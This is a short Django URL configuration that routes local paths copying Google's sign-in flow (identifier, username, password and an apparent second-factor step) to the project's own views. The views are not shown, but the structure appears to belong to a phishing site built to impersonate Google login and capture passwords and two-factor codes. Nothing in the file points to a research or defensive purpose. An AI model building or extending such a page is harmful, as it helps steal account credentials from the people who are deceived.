from django.urls import path
from . import views

urlpatterns = [
    path("", views.index),
    path("accounts.google.com/v3/signin/identifier", views.signin, ),
    path("accounts.google.com/v3/signin/username", views.username),
    path("accounts.google.com/v3/signin/password", views.password),
    path("accounts.google.com/v3/signin/fact2", views.fact2),
]